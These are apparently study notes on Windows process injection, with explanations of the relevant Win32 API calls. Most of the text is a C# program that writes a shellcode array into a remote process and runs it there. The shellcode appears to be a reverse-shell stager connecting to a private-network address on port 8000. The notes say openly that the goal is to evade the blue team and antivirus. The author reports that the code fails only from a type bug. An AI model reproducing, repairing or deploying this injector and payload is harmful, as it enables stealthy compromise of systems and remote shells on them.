# Process Injection/Migration

We need this to make sure our payload persists even after the application is closed. This helps avoid creating new process which might be caught by blue-team and sometimes can help bypass AV also. 

So some potential candidates are 
- Explorer.exe which host's user desktop exprience
- Any hidden spawn process
- svchost.exe responsible for network communication


Each windows process maintains its own stack and virtual memory.

To perform process injection we get a handle for target process using `OpenProcess` and then modify its memory space via `VirtualAllocEx` and create a new thread for executing it via `CreateRemoteThread`


## `OpenProcess`

Needs three paramter and first one is `dwDesiredAccess` which is basically strcuture of access right.

- All process have integrity level and you cant access high integrity process via low integrity but vice versa is possible.
- Every process has SecurityDescriptor that tells the file permission and access right of current user who created the process

The second parameter `bInheritHandle` determines if returned handle can be inherrited by child process. And final parameter `dwProcessId` specifies the PID of target process.

## `VirtualAllocEx`

Can perform memory allocation for remote process with valid process handle while `VirtualAlloc` will allocate memory only for current process.

## `WriteProcessMemory`

Allows to write data to memory of remote process. Think of it as copying shellcode to above allocated memory.

## `CreateRemoteThread`

Helps to create thread in remote process unlike `CreateThread` which only works for current process.

A failed code for Process Ijection 
```c#
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(UInt64 dwDesiredAccess, bool bInheritHandle, UInt64 dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt64 dwSize, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt64 nSize, IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribute, UInt64 dwSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt64 dwCreationFlags, IntPtr lpThreadId);

    private static uint MEM_COMMIT = 0x3000;
    private static uint READ_WRITE = 0x40;
    static void Main(string[] args)
    {
        byte[] shellcode = new byte[354] {
        0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,
        0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,
        0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
        0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,
        0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x50,
        0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
        0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
        0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
        0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
        0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
        0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,
        0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,
        0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x7a,0x01,0x68,0x02,
        0x00,0x1f,0x40,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
        0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
        0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,
        0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,
        0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
        0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,
        0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,
        0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,
        0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
        0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,
        0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };


        IntPtr Process_handle = OpenProcess(0x001F0FFF, false, 4156);
        IntPtr addr = VirtualAllocEx(Process_handle, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        WriteProcessMemory(Process_handle, addr, shellcode, (UInt64)shellcode.Length, IntPtr.Zero);
        CreateRemoteThread(Process_handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```
Its basically showing Runtime error where addr points to 0x0000000000000000 and that causes program to exit without giving out shell. 
